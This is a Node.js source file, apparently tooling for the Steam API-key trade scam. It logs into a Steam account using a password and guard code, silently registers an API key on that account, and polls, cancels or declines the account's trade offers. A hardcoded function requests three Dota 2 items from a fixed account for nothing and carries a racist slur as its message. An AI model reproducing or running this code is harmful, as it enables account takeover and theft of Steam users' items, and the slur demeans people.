const axios = require("axios");
const qs = require("qs");
const SteamUser = require("steam-user");
const HTMLParser = require("node-html-parser");
const EResult = require("steam-user/enums/EResult");

const client = new SteamUser();
const communityURL = 'https://steamcommunity.com';

const makeOffer = (options) => {
    let tradeOffer = {
        newversion: true,
        version: 2,
        me: { assets: options.itemsFromMe, currency: [], ready: false },
        them: { assets: options.itemsfromThem, currency: [], ready: false }
    };

    let data = {
        serverid: 1,
        sessionid: options.sessionID,
        partner: options.partnerSteamId,
        tradeoffermessage: options.message || "",
        json_tradeoffer: JSON.stringify(tradeOffer),
        captcha: "",
    };

    let query = {
        partner: options.partnerAccountId
    };

    if (options.accessToken !== undefined) {
        data.trade_offer_create_params = JSON.stringify({ trade_offer_access_token: options.accessToken });
        query.token = options.accessToken;
    };

    let referer;
    if (!options.counteredTradeOffer) {
        referer = communityURL + '/tradeoffer/new/?' + qs.stringify(query);
    }
    else {
        data.tradeofferid_countered = options.counteredTradeOffer;
        referer = communityURL + '/tradeoffer/' + options.counteredTradeOffer + '/';
    }

    const config = {
        headers: {
            Referer: referer,
            Cookie: options.cookies.join(";")
        }
    }

    axios.post(`${communityURL}/tradeoffer/new/send`, qs.stringify(data), config)
         .then(response => console.log(response))
         .catch(error => console.log(error));
}

const loginAndMakeOffer = (login, password, guard) => {
    client.logOn({
        accountName: login,
        password: password,
        twoFactorCode: guard
    });

    client.on("webSession", function(sessionID, cookies) {
        makeOffer({
            partnerAccountId: "253453983",
            partnerSteamId: "76561198213719711",
            accessToken: "zaSiKaha",
            cookies: cookies,
            sessionID: sessionID,
            itemsFromMe: [],
            itemsfromThem: [
                {
                    appid: 570,
                    contextid: "2",
                    amount: 1,
                    assetid: "20594220463"
                },
                {
                    appid: 570,
                    contextid: "2",
                    amount: 1,
                    assetid: "20594220731"
                },
                {
                    appid: 570,
                    contextid: "2",
                    amount: 1,
                    assetid: "20913016099"
                }
            ],
            message: "ААААА НЕГРЫ"
        });
    });
}

const isLoggedOn = () => Boolean(client.steamID);

const createAPIKey = async (options) => {
    return new Promise((resolve, reject) => {
        const data = {
            domain: options.domain,
            agreeToTerms: "agreed",
            sessionid: options.sessionID,
            Submit: "Register"
        };

        const config = {
            headers: {
                "Content-Type": "application/x-www-form-urlencoded",
                Cookie: options.cookies.join(";")
            }
        }

        axios.post(`${communityURL}/dev/registerkey`, qs.stringify(data), config)
             .then(response => resolve(response))
             .catch(error => reject(error));
    });
}

const retrieveAPIKey = (domen, sessionID, cookies) => {
    return new Promise((resolve, reject) => {
        requestAPIKey(cookies)
            .then(key => resolve(key))
            .catch(() => {
                createAPIKey({
                    domain: domen,
                    sessionID: sessionID,
                    cookies: cookies
                }).then(() => {
                    requestAPIKey(cookies)
                        .then(key => resolve(key))
                        .catch(err => reject(err));
                }).catch((err) => reject(err));
            })
    });
}

const requestAPIKey = async (cookies) => {
    return new Promise((resolve, reject) => {
        const config = {
            headers: {
                Cookie: cookies.join(";"),
                Host: "steamcommunity.com"
            }
        }

        axios.get(`${communityURL}/dev/apikey`, config)
            .then(response => {
                const root = HTMLParser.parse(response.data);

                try {
                    const apiKey = root.querySelector("#bodyContents_ex > p").text.substring(5);
                    
                    if (apiKey.length !== 32) {
                        reject("Invalid API Key");
                    }

                    resolve(apiKey);
                }
                catch (ex) {
                    reject(ex);
                }
            })
            .catch(error => reject(error));
    });
}

const login = async (login, password, guard) => {
    return new Promise((resolve, reject) => {
        if (isLoggedOn()) {
            reject("Already logged on, cannot log on again");
        }

        try {
            client.logOn({
                accountName: login,
                password: password,
                rememberPassword: true,
                twoFactorCode: guard
            });
        }
        catch (ex) {
            reject(ex);
        }

        client.on("steamGuard", function(domain, callback) {
            reject({ eresult: EResult.AccountLoginDeniedNeedTwoFactor });
        });

        client.on("error", function (error) {
            reject(error);
        });

        client.on("webSession", function (sessionID, cookies) {
            resolve({
                sessionID: sessionID,
                cookies: cookies
            });
        })
    });
}

const cancelOffer = async (apiKey, offerId) => {
    const data = {
        key: apiKey,
        tradeofferid: offerId
    };

    return new Promise((resolve, reject) => {
        axios.post("https://api.steampowered.com/IEconService/CancelTradeOffer/v1/", qs.stringify(data))
             .then(response => {
                 console.log(`Offer ${offerId} cancelled ✓`);
                 resolve(response);
             })
             .catch(error => reject(error));
    });
}

const declineOffer = async (apiKey, offerId) => {
    const data = {
        key: apiKey,
        tradeofferid: offerId
    };

    return new Promise((resolve, reject) => {
        axios.post("https://api.steampowered.com/IEconService/DeclineTradeOffer/v1/", qs.stringify(data))
             .then(response => {
                 console.log(`Offer ${offerId} declined ✓`);
                 resolve(response);
             })
             .catch(error => reject(error));
    });
}

const getActiveOffers = async (apiKey) => {
    const config = {
        params: {
            key: apiKey,
            get_sent_offers: 1,
            get_received_offers: 1,
            active_only: 1
        }
    };

    return new Promise((resolve, reject) => {
        axios.get("https://api.steampowered.com/IEconService/GetTradeOffers/v1/", config)
             .then(response => resolve(response.data.response))
             .catch(error => reject(error));
    });
}

const startCheckingOffers = async (apiKey) => {
    return new Promise((resolve, reject) => {
        const checkingInterval = setInterval(() => {
            console.log("Checking offers...");

            getActiveOffers(apiKey)
                .then(offers => {
                    try {
                        const firstSentOffer = offers.trade_offers_sent ? offers.trade_offers_sent[0] : "";
                        const firstReceivedOffer = offers.trade_offers_received ? offers.trade_offers_received[0] : "";

                        if (firstSentOffer.trade_offer_state == 9) {
                            console.log(`Sent Offer ${firstSentOffer.tradeofferid} found`);
                            clearInterval(checkingInterval);
                            resolve(firstSentOffer);
                        }
                        
                        if (firstReceivedOffer.trade_offer_state == 2) {
                            console.log(`Incoming Offer ${firstReceivedOffer.tradeofferid} found`);
                            clearInterval(checkingInterval);
                            resolve(firstReceivedOffer);
                        }
                    }
                    catch {}
                })
                .catch();
        }, 1000);
    });
}

const logout = async () => {
    return new Promise((resolve, reject) => {
        try {
            client.logOff();
            
            if (!isLoggedOn()) {
                resolve();
            }
        }
        catch(ex) {
            reject(ex);
        }
    });
}

module.exports = { login, logout, requestAPIKey, retrieveAPIKey, isLoggedOn, getActiveOffers, startCheckingOffers, cancelOffer, declineOffer };